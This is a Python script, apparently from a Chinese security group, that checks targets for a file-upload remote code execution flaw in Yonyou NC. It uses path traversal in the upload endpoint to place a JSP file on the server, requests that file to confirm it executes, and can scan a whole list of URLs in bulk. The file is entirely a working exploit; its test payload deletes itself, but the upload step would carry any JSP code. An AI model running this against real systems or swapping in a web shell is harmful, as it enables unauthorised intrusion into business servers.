#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : 浅梦安全
import requests
import random
import string
import argparse
from urllib3.exceptions import InsecureRequestWarning

RED = '\033[91m'
RESET = '\033[0m'
# 忽略不安全请求的警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def rand_base(n):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def check_vulnerability(url):
    filename = rand_base(6)
    # 第一个请求：上传恶意的JSP文件
    upload_url = url.rstrip('/') + '/mp/initcfg/%2e%2e/uploadControl/uploadFile'
    upload_headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarygcflwtei',
        'Connection': 'close'
    }
    upload_data = (
        '------WebKitFormBoundarygcflwtei\r\n'
        f'Content-Disposition: form-data; name="file"; filename="{filename}.jsp"\r\n'
        'Content-Type: image/jpeg\r\n\r\n'
        '<% out.println("HelloWorldTest");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n'
        '------WebKitFormBoundarygcflwtei\r\n'
        'Content-Disposition: form-data; name="submit"\r\n\r\n'
        '上传\r\n'
        '------WebKitFormBoundarygcflwtei--'
    ).encode('utf-8')

    try:
        response_upload = requests.post(upload_url, headers=upload_headers, data=upload_data, verify=False, timeout=30)
        # print(f'Upload Response Status Code: {response_upload.status_code}')

        # 第二个请求：访问上传的JSP文件
        access_url = url.rstrip('/') + f'/mp/uploadFileDir/{filename}.jsp'
        access_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36'
        }
        response_access = requests.get(access_url, headers=access_headers, verify=False, timeout=30)
        # print(f'Access Response Status Code: {response_access.status_code}')
        # print(f'Access Response Body: {response_access.text}')

        if response_upload.status_code == 200 and response_access.status_code == 200 and "HelloWorldTest" in response_access.text:
            print(f"{RED}URL [{url}] 存在用友 NC uploadControluploadFile 文件上传致RCE漏洞{RESET}")
        else:
            print(f"URL [{url}] 不存在漏洞")
    except requests.exceptions.Timeout:
        print(f"URL [{url}] 请求超时，可能存在漏洞")
    except requests.RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否存在用友 NC uploadControluploadFile 文件上传致RCE漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        check_vulnerability(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                check_vulnerability(url)

if __name__ == '__main__':
    main()
